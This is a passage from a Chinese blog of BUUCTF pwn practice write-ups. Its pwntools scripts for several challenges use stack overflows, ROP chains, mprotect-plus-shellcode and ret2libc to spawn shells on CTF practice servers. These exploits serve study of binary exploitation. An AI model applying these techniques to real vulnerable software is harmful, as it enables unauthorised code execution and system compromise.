data-src="https://cdn.staticaly.com/gh/C2yb8er/images@master/20230117/%E5%9B%BE%E7%89%87.344cnf80pyf4.webp"></p><p>没有<code>syscall</code>，故放弃。</p><h2 id="0x0b-get-started-3dsctf-2016"><a href="#0x0b-get-started-3dsctf-2016" class="headerlink" title="0x0b.get_started_3dsctf_2016"></a>0x0b.get_started_3dsctf_2016</h2><p><img lazyload alt="image" data-src="https://cdn.staticaly.com/gh/C2yb8er/images@master/20230117/%E5%9B%BE%E7%89%87.10qafbc4gh68.webp"></p><h3 id="方法一：不用交互的传参"><a href="#方法一：不用交互的传参" class="headerlink" title="方法一：不用交互的传参"></a>方法一：不用交互的传参</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span>*</span><br><span class="line">c = remote(<span class="string">&quot;node4.buuoj.cn&quot;</span>,<span class="number">26026</span>)</span><br><span class="line">main_addr = <span class="number">0x08048A20</span></span><br><span class="line">get_flag = <span class="number">0x080489A0</span></span><br><span class="line">payload = <span class="string">b&#x27;a&#x27;</span>*<span class="number">0x38</span> + p32(get_flag) + p32(<span class="number">0xdeedbeef</span>) + p32(<span class="number">0x308CD64F</span>) + p32(<span class="number">0x195719D1</span>)</span><br><span class="line">c.sendline(payload)</span><br><span class="line">c.interactive()</span><br></pre></td></tr></table></figure><p>​    理应来说是应该可以打通的但是结果是打不通：<img lazyload alt="image" data-src="https://cdn.staticaly.com/gh/C2yb8er/images@master/20230117/%E5%9B%BE%E7%89%87.2hj4xt0e8nsw.webp"></p><p>​    在网上搜了一下WP才发现是<code>本题没有开启标准输出</code></p><p><mark>tips：最后必须要返回exit，因为本题没有开启标准输入输出，输入输出会在缓冲区呆着，而exit执行后会将缓冲区输出，则可回显出flag。</mark></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span>*</span><br><span class="line">c = remote(<span class="string">&quot;node4.buuoj.cn&quot;</span>,<span class="number">26026</span>)</span><br><span class="line">main_addr = <span class="number">0x08048A20</span></span><br><span class="line">get_flag = <span class="number">0x080489A0</span></span><br><span class="line">exit_addr = <span class="number">0x0804E6A0</span></span><br><span class="line">payload = <span class="string">b&#x27;a&#x27;</span>*<span class="number">0x38</span> + p32(get_flag) + p32(main_addr) + p32(<span class="number">0x308CD64F</span>) + p32(<span class="number">0x195719D1</span>)  <span class="comment"># 传入a1，a2满足if条件</span></span><br><span class="line">c.sendline(payload)</span><br><span class="line">payload = <span class="string">b&#x27;a&#x27;</span>*<span class="number">0x38</span> + p32(exit_addr) + p32(main_addr) + p32(<span class="number">0</span>)</span><br><span class="line">c.sendline(payload)</span><br><span class="line"><span class="built_in">print</span>(c.recv())</span><br></pre></td></tr></table></figure><p><img lazyload alt="image" data-src="https://cdn.staticaly.com/gh/C2yb8er/images@master/20230117/%E5%9B%BE%E7%89%87.6p2mtf5sineo.webp"></p><h3 id="方法二：shellcode"><a href="#方法二：shellcode" class="headerlink" title="方法二：shellcode"></a>方法二：shellcode</h3><p>​    <mark>之前在wiki-ret2shellcode时候曾经考虑过的问题，但是还没有落实，趁着这道题的机会，落实一下！</mark></p><blockquote><p>利用mprotect函数</p></blockquote><p>​    因为本题是静态链接，搜了一下有<code>mprotect</code>函数，可以进行利用。</p><p><img lazyload alt="image" data-src="https://cdn.staticaly.com/gh/C2yb8er/images@master/20230117/%E5%9B%BE%E7%89%87.imy7guwegoo.webp"></p><p>vmmap一下，RW and not X</p><p><img lazyload alt="image" data-src="https://cdn.staticaly.com/gh/C2yb8er/images@master/20230117/%E5%9B%BE%E7%89%87.6wvnei5sv9mo.webp"></p><p>​    学到了一个好东西：IDA中    <code>Ctrl+s</code>    </p><p><img lazyload alt="image" data-src="https://cdn.staticaly.com/gh/C2yb8er/images@master/20230117/%E5%9B%BE%E7%89%87.2abagqdnv1kw.webp"></p><p>​    我自己写的payload但是打不通:</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 我就想利用mprotect函数将bss指定段修改成可执行，然后直接写入shellcode执行提权</span></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span>*</span><br><span class="line">context.arch = <span class="string">&#x27;i386&#x27;</span></span><br><span class="line">c = process(<span class="string">&quot;/mnt/hgfs/虚拟机共享文件夹/BUU/12&quot;</span>)</span><br><span class="line">context.terminal = [<span class="string">&#x27;gnome-terminal&#x27;</span>, <span class="string">&#x27;-x&#x27;</span>, <span class="string">&#x27;sh&#x27;</span>, <span class="string">&#x27;-c&#x27;</span>]</span><br><span class="line">main_addr = <span class="number">0x08048A20</span></span><br><span class="line">mprotect = <span class="number">0x0806EC80</span></span><br><span class="line">buf = <span class="number">0x80EB000</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># Modify to executable</span></span><br><span class="line">payload = <span class="string">b&#x27;a&#x27;</span>*<span class="number">0x38</span> + p32(mprotect) + p32(main_addr) + p32(buf) + p32(<span class="number">0x1000</span>) +p32(<span class="number">0x7</span>)</span><br><span class="line">c.sendline(payload)</span><br><span class="line"></span><br><span class="line"><span class="comment"># Write shellcode</span></span><br><span class="line">shellcode = asm(shellcraft.sh())</span><br><span class="line">payload = <span class="string">b&#x27;a&#x27;</span>*<span class="number">0x38</span> + p32(buf) + shellcode</span><br><span class="line">c.sendline(payload)</span><br><span class="line"></span><br><span class="line">c.interactive()</span><br></pre></td></tr></table></figure><p>​    打得通的版本：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 利用了read函数写入</span></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span>*</span><br><span class="line">c = remote(<span class="string">&quot;node4.buuoj.cn&quot;</span>,<span class="number">26842</span>)</span><br><span class="line">context.arch = <span class="string">&#x27;i386&#x27;</span></span><br><span class="line"><span class="comment"># c = process(&quot;/mnt/hgfs/虚拟机共享文件夹/BUU/12&quot;)</span></span><br><span class="line">context.terminal = [<span class="string">&#x27;gnome-terminal&#x27;</span>, <span class="string">&#x27;-x&#x27;</span>, <span class="string">&#x27;sh&#x27;</span>, <span class="string">&#x27;-c&#x27;</span>]</span><br><span class="line">main_addr = <span class="number">0x08048A20</span></span><br><span class="line">get_flag = <span class="number">0x080489A0</span></span><br><span class="line">exit_addr = <span class="number">0x0804E6A0</span></span><br><span class="line">mprotect_addr = <span class="number">0x0806EC80</span></span><br><span class="line">read_addr = <span class="number">0x0806E140</span></span><br><span class="line">buf = <span class="number">0x80EB000</span></span><br><span class="line"><span class="comment"># buf = 0x080EBF80 为什么这个起始位置不可以？</span></span><br><span class="line">pop_edi_esi_ebx_ret = <span class="number">0x08063adb</span></span><br><span class="line">pop_ebx_esi_edi_ret = <span class="number">0x080509a5</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">payload=<span class="string">b&#x27;a&#x27;</span>*<span class="number">0x38</span>+p32(mprotect_addr)+p32(pop_edi_esi_ebx_ret)+p32(buf)+p32(<span class="number">0x1000</span>)+p32(<span class="number">0x7</span>)+p32(read_addr)+p32(buf)+p32(<span class="number">0</span>)+p32(buf)+p32(<span class="number">0x200</span>)</span><br><span class="line"><span class="comment"># payload=b&#x27;a&#x27;*0x38+p32(mprotect_addr)+p32(pop_ebx_esi_edi_ret)+p32(buf)+p32(0x1000)+p32(0x7)+p32(read_addr)+p32(buf)+p32(0)+p32(buf)+p32(0x200)</span></span><br><span class="line"><span class="comment"># 为什么要三个寄存器？而且这三个寄存器是什么都不重要？我懂了！让esp自增然后指向read_addr!详情参看ret2libc2</span></span><br><span class="line">c.sendline(payload)</span><br><span class="line">shellcode = asm(shellcraft.sh())</span><br><span class="line">payload =shellcode</span><br><span class="line">c.sendline(payload)</span><br><span class="line"></span><br><span class="line">c.interactive()</span><br></pre></td></tr></table></figure><p>​        比起上一版，这个版本更清晰易懂！</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span>*</span><br><span class="line"><span class="comment"># c = remote(&quot;node4.buuoj.cn&quot;,26842)</span></span><br><span class="line">context.arch = <span class="string">&#x27;i386&#x27;</span></span><br><span class="line">c = process(<span class="string">&quot;/mnt/hgfs/虚拟机共享文件夹/BUU/12&quot;</span>)</span><br><span class="line">context.terminal = [<span class="string">&#x27;gnome-terminal&#x27;</span>, <span class="string">&#x27;-x&#x27;</span>, <span class="string">&#x27;sh&#x27;</span>, <span class="string">&#x27;-c&#x27;</span>]</span><br><span class="line">main_addr = <span class="number">0x08048A20</span></span><br><span class="line">mprotect = <span class="number">0x0806EC80</span></span><br><span class="line">buf = <span class="number">0x80EC000</span></span><br><span class="line">read_addr = <span class="number">0x0806E140</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># Modify to executable</span></span><br><span class="line">payload = <span class="string">b&#x27;a&#x27;</span>*<span class="number">0x38</span> + p32(mprotect) + p32(main_addr) + p32(buf) + p32(<span class="number">0x1000</span>) +p32(<span class="number">0x7</span>)</span><br><span class="line">c.sendline(payload)</span><br><span class="line"></span><br><span class="line"><span class="comment"># Write shellcode </span></span><br><span class="line">payload = <span class="string">b&#x27;a&#x27;</span>*<span class="number">0x38</span> + p32(read_addr) + p32(buf) + p32(<span class="number">0</span>) + p32(buf) +p32(<span class="number">0x100</span>)</span><br><span class="line">c.sendline(payload)</span><br><span class="line">shellcode = asm(shellcraft.sh())</span><br><span class="line">c.sendline(shellcode)</span><br><span class="line"><span class="comment"># Exec shellcode </span></span><br><span class="line"><span class="comment"># HOW? BY READ&#x27;RET</span></span><br><span class="line">c.interactive()</span><br></pre></td></tr></table></figure><h2 id="0x0c-OGeek2019-babyrop"><a href="#0x0c-OGeek2019-babyrop" class="headerlink" title="0x0c.[OGeek2019]babyrop"></a>0x0c.[OGeek2019]babyrop</h2><p><code>ret2libc3</code>  &amp;&amp; <code>ROP trick</code></p><p><img lazyload alt="image" data-src="https://cdn.staticaly.com/gh/C2yb8er/images@master/20230117/%E5%9B%BE%E7%89%87.4dj5dg9n3gw0.webp"></p><p>大佬写的很详细，详情参考：<a class="link" href="https://blog.csdn.net/Invin_cible/article/details/121322885?ops_request_misc=%257B%2522request%255Fid%2522%253A%2522167558256416800215084291%2522%252C%2522scm%2522%253A%252220140713.130102334..%2522%257D&request_id=167558256416800215084291&biz_id=0&utm_medium=distribute.pc_search_result.none-task-blog-2~all~sobaiduend~default-2-121322885-null-null.142%5Ev73%5Ewechat,201%5Ev4%5Eadd_ask,239%5Ev1%5Econtrol&utm_term=%5BOGeek2019%5Dbabyrop&spm=1018.2226.3001.4187">此处<i class="fas fa-external-link-alt"></i></a></p><p><img lazyload alt="image" data-src="https://cdn.staticaly.com/gh/C2yb8er/images@master/20230205/%E5%9B%BE%E7%89%87.46q2lsv5nveo.webp"></p><p><mark>此题所得经验：</mark></p><ol><li>一开始我实在没想到此题的溢出条件在哪里，后面看见大佬博文，才发现这个函数穿的是<code>ASCII码值</code>，基础不牢固:crying_cat_face:<img lazyload alt="image" data-src="https://cdn.staticaly.com/gh/C2yb8er/images@master/20230205/%E5%9B%BE%E7%89%87.5g0mwmmofaio.webp"></li><li><code>v1=0</code>来绕过真的让人恍然大悟。</li></ol><p><img lazyload alt="image" data-src="https://cdn.staticaly.com/gh/C2yb8er/images@master/20230205/%E5%9B%BE%E7%89%87.3xuuoah1efpc.webp"></p><h2 id="0x0d-jarvisoj-level2-x64"><a href="#0x0d-jarvisoj-level2-x64" class="headerlink" title="0x0d.jarvisoj_level2_x64"></a>0x0d.jarvisoj_level2_x64</h2><p><img lazyload alt="image" data-src="https://cdn.staticaly.com/gh/C2yb8er/images@master/20230117/%E5%9B%BE%E7%89%87.4iv5jolko5c0.webp"></p><p>​    简单题，有<code>system</code>，有<code>/bin/sh</code></p><figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">ROPgadget --binary 14 --string &#x27;/bin/sh&#x27;</span></span><br><span class="line"><span class="string">objdump -d 14 | grep &#x27;plt&#x27;</span></span><br><span class="line"><span class="string">ROPgadget --binary 14 --only &#x27;pop|ret&#x27; | grep &#x27;rdi&#x27;</span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">c = remote(<span class="string">&quot;node4.buuoj.cn&quot;</span>,<span class="number">27765</span>)</span><br><span class="line">context.arch = <span class="string">&#x27;amd64&#x27;</span></span><br><span class="line">bin_sh = <span class="number">0x600a90</span></span><br><span class="line">system_addr = <span class="number">0x4004c0</span></span><br><span class="line">pop_rdi_ret = <span class="number">0x4006b3</span></span><br><span class="line">c.recvuntil(<span class="string">b&#x27;Input:\n&#x27;</span>)</span><br><span class="line">payload = <span class="string">b&#x27;a&#x27;</span>*<span class="number">0x88</span> + p64(pop_rdi_ret) + p64(bin_sh) + p64(system_addr)</span><br><span class="line">c.sendline(payload)</span><br><span class="line">c.interactive()</span><br></pre></td></tr></table></figure><p><img lazyload alt="image" data-src="https://cdn.staticaly.com/gh/C2yb8er/images@master/20230117/%E5%9B%BE%E7%89%87.4745hx1vhp1c.webp"></p><h2 id="0x0e-HarekazeCTF2019-baby-rop"><a href="#0x0e-HarekazeCTF2019-baby-rop" class="headerlink" title="0x0e.[HarekazeCTF2019]baby_rop"></a>0x0e.[HarekazeCTF2019]baby_rop</h2><p><img lazyload alt="image" data-src="https://cdn.staticaly.com/gh/C2yb8er/images@master/20230117/%E5%9B%BE%E7%89%87.43rj8gqp5wsg.webp"></p><p>​    考法与前题目一致简单题</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">from pwn import *</span><br><span class="line">c = remote(&quot;node4.buuoj.cn&quot;,28511)</span><br><span class="line">context.arch = &#x27;amd64&#x27;</span><br><span class="line">bin_sh = 0x0601048</span><br><span class="line">system_addr = 0x400490</span><br><span class="line">pop_rdi_ret = 0x400683</span><br><span class="line">c.recvuntil(b&#x27;What&#x27;s your name? &#x27;)</span><br><span class="line">payload = b&#x27;a&#x27;*0x18 + p64(pop_rdi_ret) + p64(bin_sh) + p64(system_addr)</span><br><span class="line">c.sendline(payload)</span><br><span class="line">c.interactive()</span><br></pre></td></tr></table></figure><p>​    只不过flag藏得很深：</p><p><img lazyload alt="image" data-src="https://cdn.staticaly.com/gh/C2yb8er/images@master/20230117/%E5%9B%BE%E7%89%87.57dajuf4dhts.webp"></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">find / - name &#x27;flag&#x27;</span><br></pre></td></tr></table></figure><p><img lazyload alt="image" data-src="https://cdn.staticaly.com/gh/C2yb8er/images@master/20230117/%E5%9B%BE%E7%89%87.6nisyx4km5q8.webp"></p><p><img lazyload alt="image" data-src="https://cdn.staticaly.com/gh/C2yb8er/images@master/20230117/%E5%9B%BE%E7%89%87.1a21v72uanb4.webp"></p><h2 id="0x10-ciscn-2019-en-2"><a href="#0x10-ciscn-2019-en-2" class="headerlink" title="0x10.ciscn_2019_en_2"></a>0x10.ciscn_2019_en_2</h2><p><img lazyload alt="image" data-src="https://cdn.staticaly.com/gh/C2yb8er/images@master/20230118/%E5%9B%BE%E7%89%87.3tuloknore2o.webp"></p><p>不知道为什么这道题和第八题一模一样，那我就慷慨地收下flag啦！</p><p>题解链接：<a href="http://c2yb8er.cn/2023/01/17/BUU-PWN%E5%88%B7%E9%A2%98%E7%AC%94%E8%AE%B0%E2%91%A0/">点此处跳转</a></p><p><img lazyload alt="image" data-src="https://cdn.staticaly.com/gh/C2yb8er/images@master/20230118/%E5%9B%BE%E7%89%87.6uco3gsajlvk.webp"></p><h2 id="0x11-not-the-same-3dsctf-2016"><a href="#0x11-not-the-same-3dsctf-2016" class="headerlink" title="0x11.not_the_same_3dsctf_2016"></a>0x11.not_the_same_3dsctf_2016</h2><p><img lazyload alt="image" data-src="https://cdn.staticaly.com/gh/C2yb8er/images@master/20230118/%E5%9B%BE%E7%89%87.3r6llghqlq9s.webp"></p><h3 id="方法一：mprotect-详情参考十二题）"><a href="#方法一：mprotect-详情参考十二题）" class="headerlink" title="方法一：mprotect(详情参考十二题）"></a>方法一：mprotect(详情参考十二题）</h3><p><img lazyload alt="image" data-src="https://cdn.staticaly.com/gh/C2yb8er/images@master/20230118/%E5%9B%BE%E7%89%87.1ik9w9v1ibgg.webp"></p><h3 id="方法二：正常解法-写入和读取"><a href="#方法二：正常解法-写入和读取" class="headerlink" title="方法二：正常解法(写入和读取)"></a>方法二：正常解法(写入和读取)</h3><p><img lazyload alt="image" data-src="https://cdn.staticaly.com/gh/C2yb8er/images@master/20230118/%E5%9B%BE%E7%89%87.15dz21cvk1a8.webp"></p><p>栈溢出跳转到这里将flag写入到<code>fl4g</code>所在位置，再利用打印函数将其打印出来。</p><p>puts函数是最好的选择，但是很遗憾本题没有。</p><p>然后我想到了printf函数，虽然本题有但是我貌似调用不来呜呜呜：<img lazyload alt="image" data-src="https://cdn.staticaly.com/gh/C2yb8er/images@master/20230118/%E5%9B%BE%E7%89%87.gxsy29p1hww.webp"></p><p>然后我想到了write函数，将它写到标准输出<code>1</code>就可以输出flag了。</p><p><img lazyload alt="image" data-src="https://cdn.staticaly.com/gh/C2yb8er/images@master/20230118/%E5%9B%BE%E7%89%87.7lh4xduo4oe8.webp"></p><h4 id="payload如下："><a href="#payload如下：" class="headerlink" title="payload如下："></a>payload如下：</h4><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">c = process(<span class="string">&quot;/mnt/hgfs/虚拟机共享文件夹/BUU/17&quot;</span>)</span><br><span class="line"><span class="comment"># c = remote(&quot;node4.buuoj.cn&quot;,28085)</span></span><br><span class="line">context.arch = <span class="string">&#x27;i386&#x27;</span></span><br><span class="line">main_addr = <span class="number">0x080489E0</span></span><br><span class="line">get_secret = <span class="number">0x080489A0</span></span><br><span class="line">write_addr = <span class="number">0x0806E270</span></span><br><span class="line">printf_addr = <span class="number">0x0804F0A0</span></span><br><span class="line">flag_addr = <span class="number">0x080ECA2D</span></span><br><span class="line">payload = <span class="string">b&#x27;a&#x27;</span>*<span class="number">0x2d</span>  + p32(get_secret) + p32(main_addr) </span><br><span class="line">c.sendline(payload)</span><br><span class="line"></span><br><span class="line">payload = <span class="string">b&#x27;a&#x27;</span>*<span class="number">0x2d</span> + p32(write_addr) + p32(<span class="number">0xdeedbeef</span>) + p32(<span class="number">1</span>) + p32(flag_addr) + p32(<span class="number">100</span>) </span><br><span class="line">c.sendline(payload)</span><br><span class="line"></span><br><span class="line">c.interactive()</span><br></pre></td></tr></table></figure><p>这道题的经验就是：<mark>write函数的使用</mark></p><p><mark>补充:printf函数的打法</mark></p><p>直接入参：本地可以打通，但是远程打不通：</p><p><img lazyload alt="image" data-src="https://cdn.staticaly.com/gh/C2yb8er/images@master/20230118/%E5%9B%BE%E7%89%87.1vn4o6ll3eio.webp"></p><p><img lazyload alt="image" data-src="https://cdn.staticaly.com/gh/C2yb8er/images@master/20230118/%E5%9B%BE%E7%89%87.3bcrw6azw0g.webp"></p><p>看见远程报<code>timeout</code>错误，我就想到去调用exit函数主动杀死进程，没想到真的打通了，估计是调用的printf函数最后不知道咋返回结束，后面调用了exit终止就正常回显了。</p><p><img lazyload alt="image" data-src="https://cdn.staticaly.com/gh/C2yb8er/images@master/20230118/%E5%9B%BE%E7%89%87.1d2k4p7z5um8.webp"></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="comment"># c = process(&quot;/mnt/hgfs/虚拟机共享文件夹/BUU/17&quot;)</span></span><br><span class="line">c = remote(<span class="string">&quot;node4.buuoj.cn&quot;</span>,<span class="number">25437</span>)</span><br><span class="line">context.arch = <span class="string">&#x27;i386&#x27;</span></span><br><span class="line">main_addr = <span class="number">0x080489E0</span></span><br><span class="line">get_secret = <span class="number">0x080489A0</span></span><br><span class="line">write_addr = <span class="number">0x0806E270</span></span><br><span class="line">printf_addr = <span class="number">0x0804F0A0</span></span><br><span class="line">flag_addr = <span class="number">0x080ECA2D</span></span><br><span class="line">exit_addr = <span class="number">0x0804E660</span></span><br><span class="line">pop2 = <span class="number">0x080483ba</span></span><br><span class="line">payload = <span class="string">b&#x27;a&#x27;</span>*<span class="number">0x2d</span>  + p32(get_secret) + p32(main_addr) </span><br><span class="line">c.sendline(payload)</span><br><span class="line"></span><br><span class="line">payload = <span class="string">b&#x27;a&#x27;</span>*<span class="number">0x2d</span> + p32(printf_addr) + p32(pop2) +p32(flag_addr) + p32(exit_addr) + p32(<span class="number">0xdeadbeef</span>) + p32(<span class="number">0</span>)</span><br><span class="line"></span><br><span class="line">c.sendline(payload)</span><br><span class="line"></span><br><span class="line">c.interactive()</span><br></pre></td></tr></table></figure><h2 id="0x12-ciscn-2019-n-5"><a href="#0x12-ciscn-2019-n-5" class="headerlink" title="0x12.ciscn_2019_n_5"></a>0x12.ciscn_2019_n_5</h2><p><img lazyload alt="image" data-src="https://cdn.staticaly.com/gh/C2yb8er/images@master/20230118/%E5%9B%BE%E7%89%87.2wlrsxj48gqo.webp"></p><p><img lazyload alt="image" data-src="https://cdn.staticaly.com/gh/C2yb8er/images@master/20230118/%E5%9B%BE%E7%89%87.4jw2t6u6yu80.webp"></p><p>思路挺简单：写入shellcode，栈溢出执行。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="comment">#c = process(&quot;/mnt/hgfs/虚拟机共享文件夹/BUU/18&quot;)</span></span><br><span class="line">c = remote(<span class="string">&quot;node4.buuoj.cn&quot;</span>,<span class="number">29845</span>)</span><br><span class="line">context.arch = <span class="string">&#x27;amd64&#x27;</span></span><br><span class="line">shellcode = asm(shellcraft.sh())</span><br><span class="line">c.recvuntil(<span class="string">b&quot;tell me your name\n&quot;</span>)</span><br><span class="line">c.sendline(shellcode)</span><br><span class="line">shell_addr = <span class="number">0x0601080</span></span><br><span class="line">c.recvuntil(<span class="string">b&#x27;What do you want to say to me?\n&#x27;</span>)</span><br><span class="line">payload = <span class="string">b&#x27;a&#x27;</span>*<span class="number">0x28</span> + p64(shell_addr)</span><br><span class="line">c.sendline(payload)</span><br><span class="line">c.interactive()</span><br></pre></td></tr></table></figure><p>​    远程打得通，本地打不通。</p><p>​    原因我拿ida查看了一下bss段在本地仍属于不可执行。</p><p><img lazyload alt="image" data-src="https://cdn.staticaly.com/gh/C2yb8er/images@master/20230118/%E5%9B%BE%E7%89%87.3i0xxctq4e0w.webp"></p><h2 id="0x13-others-shellcode"><a href="#0x13-others-shellcode" class="headerlink" title="0x13.others_shellcode"></a>0x13.others_shellcode</h2><p><img lazyload alt="image" data-src="https://cdn.staticaly.com/gh/C2yb8er/images@master/20230118/%E5%9B%BE%E7%89%87.7c37i3ict3eo.webp"></p><p>注意此题开启了<code>PIE保护</code></p><p><img lazyload alt="image" data-src="https://cdn.staticaly.com/gh/C2yb8er/images@master/20230118/%E5%9B%BE%E7%89%87.hmpr883jluo.webp"></p><p>代码结构很简单：<a class="link" href="https://blog.csdn.net/wcccg/article/details/78496940?ops_request_misc=%257B%2522request%255Fid%2522%253A%2522167401138416800217079054%2522%252C%2522scm%2522%253A%252220140713.130102334..%2522%257D&request_id=167401138416800217079054&biz_id=0&utm_medium=distribute.pc_search_result.none-task-blog-2~all~sobaiduend~default-2-78496940-null-null.142%5Ev71%5Ewechat,201%5Ev4%5Eadd_ask&utm_term=__asm&spm=1018.2226.3001.4187">__asm关键字<i class="fas fa-external-link-alt"></i></a></p><p><img lazyload alt="image" data-src="https://cdn.staticaly.com/gh/C2yb8er/images@master/20230118/%E5%9B%BE%E7%89%87.paexend20qo.webp"></p><p>不需要payload的一道题，但是让我长见识了__asm</p><h2 id="0x14ciscn-2019-ne-5"><a href="#0x14ciscn-2019-ne-5" class="headerlink" title="0x14ciscn_2019_ne_5"></a>0x14ciscn_2019_ne_5</h2><p><img lazyload alt="image" data-src="https://cdn.staticaly.com/gh/C2yb8er/images@master/20230118/%E5%9B%BE%E7%89%87.68q7ny6rgjnk.webp"></p><p><img lazyload alt="image" data-src="https://cdn.staticaly.com/gh/C2yb8er/images@master/20230118/%E5%9B%BE%E7%89%87.6u2x652gin0g.webp"></p><p>​    好题！初步看了一遍还没发现进攻点。</p><p><img lazyload alt="image" data-src="https://cdn.staticaly.com/gh/C2yb8er/images@master/20230118/%E5%9B%BE%E7%89%87.z9m0baknrpc.webp"></p><p>​    找到溢出点了，先add，再利用strcpy造成溢出。</p><p>​    有<code>system</code>无<code>bin/sh</code>，而且payload长度限制在128，而且偏移量为76，我们剩下的空间只有<code>52</code>字节。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="comment"># c = process(&quot;/mnt/hgfs/虚拟机共享文件夹/BUU/20&quot;)</span></span><br><span class="line">c =remote(<span class="string">&quot;node4.buuoj.cn&quot;</span>,<span class="number">28642</span>)</span><br><span class="line">context.arch = <span class="string">&#x27;i386&#x27;</span></span><br><span class="line">c.recvuntil(<span class="string">b&quot;Please input admin password:&quot;</span>)</span><br><span class="line">c.sendline(<span class="string">b&quot;administrator&quot;</span>)</span><br><span class="line"></span><br><span class="line">c.sendline(<span 